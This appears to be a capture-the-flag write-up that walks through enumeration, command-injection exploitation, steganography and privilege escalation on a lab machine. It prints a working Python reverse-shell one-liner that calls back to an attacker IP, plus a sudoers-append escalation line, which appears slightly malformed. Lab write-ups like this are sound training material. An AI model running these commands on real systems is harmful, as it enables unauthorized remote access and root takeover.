

# Nmap Enumeration

We begin with the port scanning phase using the `nmap` tool:

```bash
nmap -p- --open -n -Pn --min-rate 5000 -sCV -sS <TARGET-IP> -oN <NAME> -vvv
```

<img src="/budahacksecurity/uploads/md_images/boku/bakugo1.png" style="max-width:100%; border-radius:8px;">

As we can observe, we found **two open ports**:

* **80/tcp**: HTTP
* **22/tcp**: SSH

---

# Directory Enumeration (Gobuster)

We use `gobuster` to brute-force directories:

```bash
gobuster dir -u http://<TARGET-IP> -w /usr/share/wordlists/dirb/common.txt
```

Initial results:

<img src="/budahacksecurity/uploads/md_images/boku/bakugo2.png" style="max-width:100%; border-radius:8px;">

We discovered the `/assets` directory. When accessing it, nothing useful is displayed.

We perform brute force inside the `assets` directory:

```bash
gobuster dir -u http://<TARGET-IP>/assets -w /usr/share/wordlists/dirb/common.txt
```

<img src="/budahacksecurity/uploads/md_images/boku/bakugo3.png" style="max-width:100%; border-radius:8px;">

Inside the `/assets` directory, we find a file called `index.php`.

---

# Directory Enumeration (Dirsearch)

We run `dirsearch` to search for additional files or vulnerabilities:

```bash
dirsearch -u http://<TARGET-IP>/assets
```

<img src="/budahacksecurity/uploads/md_images/boku/bakugo4.png" style="max-width:100%; border-radius:8px;">

Here we detect a **command injection vulnerability** in `index.php`.

---

# Command Injection Exploitation

While interacting with the vulnerability, we find text encoded in **Base64**.
We use `CyberChef` to decode it.

<img src="/budahacksecurity/uploads/md_images/boku/bakugo7.png" style="max-width:100%; border-radius:8px;">

Once the vulnerability is understood, we proceed to upload a **Python reverse shell**:

```bash
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR-IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

<img src="/budahacksecurity/uploads/md_images/boku/bakugo8.png" style="max-width:100%; border-radius:8px;">

We successfully gain access to the machine.

---

# Information Discovery

### Interesting Files

While exploring the system, we find a directory containing images:

<img src="/budahacksecurity/uploads/md_images/boku/bakugo9.png" style="max-width:100%; border-radius:8px;">

We copy the images to our local machine for further analysis:

```bash
scp usuario@<TARGET-IP>:/path/to/images .
```

### Encoded Passwords

We also find a file containing a password encoded in Base64:

<img src="/budahacksecurity/uploads/md_images/boku/bakugo11.png" style="max-width:100%; border-radius:8px;">

We decode the password:

```bash
echo "<encoded-password>" | base64 -d
```

---

# Steganography Analysis

While analyzing the image `0neforall.jpg`, we notice that it contains an error.
We use `hexeditor` to inspect its contents:

```bash
hexeditor 0neforall.jpg
```

<img src="/budahacksecurity/uploads/md_images/boku/bakugo13.png" style="max-width:100%; border-radius:8px;">

The header indicates that the image is actually in **PNG format**.
We fix the issue by changing the header to **JPG**.

<img src="/budahacksecurity/uploads/md_images/boku/bakugo14.png" style="max-width:100%; border-radius:8px;">

### Steghide Extraction

We use `steghide` to extract hidden data from the image:

```bash
steghide extract -sf 0neforall.jpg
```

<img src="/budahacksecurity/uploads/md_images/boku/bakugo16.png" style="max-width:100%; border-radius:8px;">

This reveals the **username and password** needed to access the SSH service.

---

# SSH Access

We connect to the machine using the extracted credentials:

```bash
ssh usuario@<TARGET-IP>
```

<img src="/budahacksecurity/uploads/md_images/boku/bakugo17.png" style="max-width:100%; border-radius:8px;">

---

# Privilege Escalation

We identify that the user can execute a script with elevated privileges.
We modify the `sudoers` file to grant our user superuser privileges:

```bash
deku ALL=NOPASSWD: ALL >> /etc/sudoers
```

Finally, we obtain **root access** and retrieve the second flag.

<img src="/budahacksecurity/uploads/md_images/boku/bakugo18.png" style="max-width:100%; border-radius:8px;">

---

# Conclusion

We successfully completed the **initial access, exploitation, and privilege escalation**, obtaining the required flags.


